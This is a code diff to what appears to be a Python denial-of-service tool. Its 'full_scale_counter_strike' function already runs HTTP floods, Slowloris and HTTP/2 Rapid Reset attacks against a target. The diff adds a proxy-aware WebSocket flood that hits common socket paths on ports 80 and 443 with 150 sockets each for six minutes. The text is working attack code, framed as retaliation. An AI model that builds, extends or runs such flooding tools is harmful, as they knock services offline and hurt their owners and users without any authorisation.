@@ -171,6 +171,7 @@ def full_scale_counter_strike(target, use_proxy, network_interface):
         "threads": 80,  # Drastically reduced for floods
         "slowloris_sockets": 150,  # Still high, as these are lightweight
         "h2_threads": 20,  # Still very effective with fewer threads
+        "websocket_sockets": 150,  # NEW: Sockets for WebSocket attack
         "duration": 360,
     }
     print(
@@ -222,6 +223,14 @@ def full_scale_counter_strike(target, use_proxy, network_interface):
     for port in [443, 8443]:  # H2 Reset
         args = (target, port, params["duration"], stop_event, pause_event, params["h2_threads"])
         attack_threads.append(launch_attack_thread(counter_strike_helper.attack_h2_rapid_reset, args))
+    # NEW: WebSocket Flood (Proxy-aware)
+    # Attackers need to discover the correct path, but we'll target common ones.
+    for path in ["/socket.io/", "/ws", "/chat"]:
+        # We'll target both standard web ports
+        for port in [80, 443]:
+            args = (
+                target, path, port, params["duration"], stop_event, pause_event, params["websocket_sockets"], use_proxy)
+            attack_threads.append(launch_attack_thread(counter_strike_helper.attack_websocket_flood, args))
 
     print(f"[+] Full-scale attack launched. Press Ctrl+C to stop.")
     try:
